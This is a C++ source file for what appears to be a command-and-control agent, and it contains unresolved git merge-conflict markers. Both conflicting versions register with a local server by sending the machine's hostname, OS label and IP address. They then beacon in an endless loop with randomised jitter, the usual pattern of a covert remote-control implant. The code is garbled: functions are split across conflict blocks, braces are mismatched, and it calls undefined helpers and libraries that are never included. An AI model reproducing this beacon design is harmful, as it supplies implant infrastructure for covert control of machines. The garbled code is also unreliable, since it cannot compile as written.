#include <iostream>
#include <string>
#include <tuple>
#include <stdexcept>
#include <curl/curl.h>

<<<<<<< HEAD
#include "Generic/httpRequests.h"
=======
#ifdef _WIN32
    #include <winsock2.h>
    #include <windows.h>
    #pragma comment(lib, "Ws2_32.lib")
#else
    #include <unistd.h>
    #include <arpa/inet.h>
#endif

class Client {
public:
    std::pair<int, std::string> get_request(const std::string& url) {
        web::http::client::http_client client(U(url));
        web::http::http_response response = client.request(web::http::methods::GET).get();
        int status = response.status_code();
        std::string data = response.extract_string().get();
        return {status, data};
    }
>>>>>>> d6c7eda (crying)

#ifdef __unix__
#include "Linux/generic.h"
#endif
#ifdef _WIN32
#include "Windows/generic.h"
#endif

<<<<<<< HEAD

int main() {
    std::string ID = "";
    int Jitter = -1;
    int Timer = -1;
    while (true) {
        try {
            if (ID != "" && Jitter != -1 && Timer != -1) {
                auto result = httpReconnect("127.0.0.1", ID, Jitter, Timer);
                if (std::get<0>(result) == -1) {
                    continue;
=======
    void beacon(int timer, int user_id) {
        while (true) {
            std::string url = "http://" + address[0] + ":" + address[1] + "/beacon?id=" + std::to_string(user_id);
            auto r = get_request(url);
            web::json::value data;
            try {
                data = web::json::value::parse(r.second);
            } catch (const web::json::json_exception&) {
                // Handle JSON parse error
                std::cerr << "JSON parse error\n";
            }

            if (data.has_field(U("timer"))) {
                timer = data[U("timer")].as_integer();
            }

            try {
                std::this_thread::sleep_for(std::chrono::seconds(timer + rand() % (2 * jitter + 1) - jitter));
            } catch (const std::exception&) {
                std::this_thread::sleep_for(std::chrono::seconds(timer));
            }
        }
    }

    std::tuple<int, int, int> httpConnection() {
        std::string url = "http://" + address[0] + ":" + address[1] + "/connection";
        char hostname[1024];
        hostname[1023] = '\0';
        gethostname(hostname, 1023);
        std::string lang = "C++";
        std::string address = inet_ntoa(*((struct in_addr*)gethostbyname(hostname)->h_addr_list[0]));
        auto r = get_request(url + "?name=" + std::string(hostname) + "&os=" + lang + "&address=" + address);
        web::json::value data;
        try {
            data = web::json::value::parse(r.second);
        } catch (const web::json::json_exception&) {
            std::cerr << "Error parsing JSON\n";
        }
        return std::make_tuple(data[U("timer")].as_integer(), data[U("id")].as_integer(), data[U("jitter")].as_integer());
    }

private:
    std::vector<std::string> address = {"localhost", "8080"};
    int jitter = 5;
};

int main() {
    int timer = 20;
    int ID = -1;
    int jitter = -1;

    try {
        Client client;
        while (true) {
            try {
                if (ID != -1 && jitter != -1) {
                    std::cout << "Need to reconnect\n";
                } else {
                    std::tie(timer, ID, jitter) = client.httpConnection();
>>>>>>> d6c7eda (crying)
                }
            } else {
                auto result = httpConnection("127.0.0.1");
                if (std::get<0>(result) == -1) {
                    continue;
                }
                Timer = std::get<0>(result);
                ID = std::get<1>(result);
                Jitter = std::get<2>(result);
            }
            int err = beacon("127.0.0.1:8080", ID, Jitter, Timer);
            if (err == -1) {
                continue;
            }


        } catch (const std::exception& e) {
            std::cerr << "Failed to establish HTTP connection: " << e.what() << std::endl;
            return 1;
        }
    }
    return 0;
}
